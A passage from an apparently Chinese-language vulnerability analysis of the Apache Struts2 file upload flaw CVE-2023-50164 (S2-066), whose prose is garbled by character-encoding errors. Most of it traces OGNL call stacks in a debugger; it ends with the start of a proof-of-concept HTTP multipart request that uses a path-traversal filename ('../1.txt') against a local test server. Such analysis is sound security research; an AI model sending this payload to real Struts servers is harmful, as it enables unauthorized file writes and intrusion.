			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
ä¸ç”¨çœ‹è¿™ä¸‰ä¸ª,è¿è¡Œåˆ° Ognl.setValue å¤„æ­¥å…¥
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2041.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2042.png)

(åˆ¤æ–­,ç›´æ¥æ­¥è¿‡è¿›å…¥elseå³å¯)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2043.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2044.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2045.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2046.png)

å¯ä»¥çœ‹åˆ°åœ¨å±æ€§èµ‹å€¼å³ `OgnlRuntime#setProperty` å‰, å…ˆè¿›è¡Œäº†èƒ½ä¸èƒ½å¯¹è¯¥å±æ€§èµ‹å€¼çš„åˆ¤æ–­

### Part 3.2

è¿è¡Œåˆ° `OgnlRuntime.*hasSetProperty*(ognlContext, o, name)` å¤„, æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2047.png)

å¯¹è¯¥å±æ€§æœ‰æ—  `setter` æ–¹æ³•åˆ¤æ–­
æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2048.png)

æ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•°, æ–¹æ³•æ—¶å€™å¯ç”¨, å…¶ä¸­é¦–å…ˆè·å¾—å‡½æ•°

æ­¥å…¥ `getSetMethod`

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2049.png)

åˆé€šè¿‡ `_getSetMethod` æ¥è·å¾— `setter` , æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2050.png)

å› ä¸ºè¿”å›çš„æ˜¯ `Method`, æ‰€ä»¥æˆ‘ä»¬åªçœ‹å¯¹ `methods` ç›¸å…³éƒ¨åˆ†å³å¯, åœ¨1823è¡Œè°ƒç”¨äº† `getDeclaredMethods` å‡½æ•°,é¡¾åæ€ä¹‰è·å–å…¬å…±æ–¹æ³•, æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2051.png)

å¯ä»¥çœ‹åˆ°æœ‰ä¸ªå…³äº `basename` çš„å˜é‡, æ˜¯ç”± `capitalizeBeanPropertyName` å‡½æ•°èµ‹å€¼çš„, è·å–å¤§å†™çš„å±æ€§å

æ­¥å…¥æŸ¥çœ‹

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
																			->OgnlRuntime#capitalizeBeanPropertyName
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2052.png)

å®¡è®¡ä¸€ä¸‹ä¸éš¾çœ‹å‡ºè¿›è¡Œäº†å››ç§åˆ¤æ–­

1. å¦‚æœå±æ€§åé•¿åº¦ä¸º1, é‚£ä¹ˆè¿”å›å±æ€§åå¤§å†™
2. å¦‚æœå±æ€§åä»¥ `get` å¼€å¤´, ä»¥ `()` ç»“å°¾, ä¸”ç¬¬4ä½ä¸ºå¤§å†™å­—æ¯, ç›´æ¥è¿”å›å±æ€§å
3. å¦‚æœå±æ€§åä»¥ `set` å¼€å¤´, ä»¥ `)` ç»“å°¾, ä¸”ç¬¬4ä½ä¸ºå¤§å†™å­—æ¯, ç›´æ¥è¿”å›å±æ€§å
4. å¦‚æœå±æ€§åä»¥ `is` å¼€å¤´, ä»¥ `()` ç»“å°¾, ä¸”ç¬¬3ä½ä¸ºå¤§å†™å­—æ¯, ç›´æ¥è¿”å›å±æ€§å
5. è·å–å±æ€§åçš„ç¬¬ä¸€äºŒä½, å†è¿›è¡Œåˆ¤æ–­
    1. å¦‚æœç¬¬ä¸€ä½æ˜¯å°å†™å­—æ¯, ç¬¬äºŒä½æ˜¯å¤§å†™å­—æ¯, ç›´æ¥è¿”å›å±æ€§å
    2. å…¶ä»–æƒ…å†µ, å±æ€§åé¦–å­—æ¯å¤§å†™å¹¶è¿”å›

è¿è¡Œä¸€ä¸‹

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2053.png)

è¿”å›

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
```

å¾€ä¸‹çœ‹, æ¥åˆ° *`collectAccessors`,* æ­¥å…¥

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2054.png)

(æŒºå¥‡æ€ªçš„, ä¸€å¼€å§‹ `basename` è·‘å‡ºæ¥æ˜¯ç©ºçš„, æŠŠæœåŠ¡é‡å¯é‡æ–°è°ƒè¯•ä¹‹ååˆåŒ¹é…åˆ° `Upload` äº†)

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
																			->OgnlRuntime#collectAccesso
```

å½“è¿è¡Œå®Œ `c.getDeclaredMethods();` å¯ä»¥çœ‹åˆ°, `UploadAction` ç±»ä¸­æ‰€æœ‰æ–¹æ³•å·²ç»è¢«è·å–äº†

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2055.png)

æ¥ç€å¯¹è·å–çš„æ–¹æ³•æ¥äº†ä¸€ä¸ªå¾ªç¯

1. å¦‚æœæ–¹æ³•æ˜¯ä¸€ä¸ªæ¥å£, è¿‡
2. å¦‚æœæ–¹æ³•å¯ä»¥è°ƒç”¨, æ‰§è¡Œ `addIfAccessor`

çœ‹ä¸€ä¸‹ `addIfAccessor` é‡Œå‘ç”Ÿäº†ä»€ä¹ˆ, ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯ `getUpload()`, è‚¯å®šæ˜¯å¯ä»¥é€šè¿‡ if çš„

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2056.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#hasSetProperty
															->OgnlRuntime#hasSetMethod
																->OgnlRuntime#getSetMethod
																	->OgnlRuntime#_getSetMethod
																		->OgnlRuntime#getDeclaredMethods
																			->OgnlRuntime#collectAccessor
																				->OgnlRuntime#addIfAccessor
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2057.png)

è¿˜æ˜¯è¿›è¡Œäº†ä¸€ç³»åˆ—åˆ¤æ–­, æ»¡è¶³åˆ¤æ–­çš„æ–¹æ³•ä¼šè¢«åŠ å…¥åˆ° `result` è¿™ä¸ª list ä¸­

1. æ–¹æ³•åè¦ä»¥ `basename` ç»“å°¾
    1. ä»¥ `set` æˆ– `get` æˆ– `is` å¼€å¤´
        1. `basename` çš„é•¿åº¦=æ–¹æ³•åé•¿åº¦-å‰ç¼€é•¿åº¦(`findSets`é»˜è®¤ä¸º true ä¸ç®¡)

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2058.png)

é€šè¿‡è¿™ä¸ªå‡½æ•°, ç­›é€‰å‡ºäº† `setter` 

![Screenshot_20231221_131901.png](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Screenshot_20231221_131901.png)

ä» `ParametersInterceptor#setParameters` è¿­ä»£å¼€å§‹, å°±æ˜¯ä¸ºäº†å¯»æ‰¾ ac ä¸Šä¸‹æ–‡ä¸­æ–‡ä»¶ä¿¡æ¯åœ¨ `UploadAction` é‡Œå¯¹åº”çš„ `setter`

ä¸Šé¢å±•ç¤ºçš„å°±æ˜¯å¯»æ‰¾ `setUpload` çš„è°ƒè¯•è¿‡ç¨‹

### Part 3.3

å›åˆ° `CompoundRootAccessor#setProperty`

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2059.png)

é€šè¿‡äº† `OgnlRuntime#hasSetProperty` åˆ¤æ–­, æˆ‘ä»¬æ¥åˆ° `OgnlRuntime#setProperty`, æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2060.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2061.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2062.png)

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
																	->ObjectPropertyAccessor#setPossibleProperty
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2063.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
																	->ObjectPropertyAccessor#setPossibleProperty
																		->OgnlRuntime#setMethodValue
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2064.png)

æ­¥å…¥

```
ParametersInterceptor#setParameters
	->OgnlValueStack#setParameter
		->OgnlValueStack#setValue
			->OgnlValueStack#trySetValue
				->OgnlUtil#setValue
/*
					->lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
						->execute:-1, OgnlUtil$$Lambda/0x00007ff7b427aba0 (com.opensymphony.xwork2.ognl)
							->compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
*/
								->Ognl#setValue
									->SimpleNode#setValue
										->SimpleNode#evaluateSetValueBody
											->ASTProperty#setValueBody
												->OgnlRuntime#setProperty
													->CompoundRootAccessor#setProperty
														->OgnlRuntime#setProperty
															->accessor#setProperty
																->ObjectPropertyAccessor#setProperty
																	->ObjectPropertyAccessor#setPossibleProperty
																		->OgnlRuntime#setMethodValue
																			->OgnlRuntime#callAppropriateMethod
```

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2065.png)

å†å¾€åæ­¥å…¥, æˆåŠŸè°ƒç”¨ `setUpload`

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2066.png)

è°ƒç”¨æ ˆå¦‚ä¸‹

```
setUpload:24, UploadAction (com.struts2)
invoke:-1, GeneratedMethodAccessor24 (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 1385670583 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$57)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
```

# æ¼æ´åˆ©ç”¨

ä¸¤ç§POC

```
POST /apachestrutsdemo_war_exploded/upload.action HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
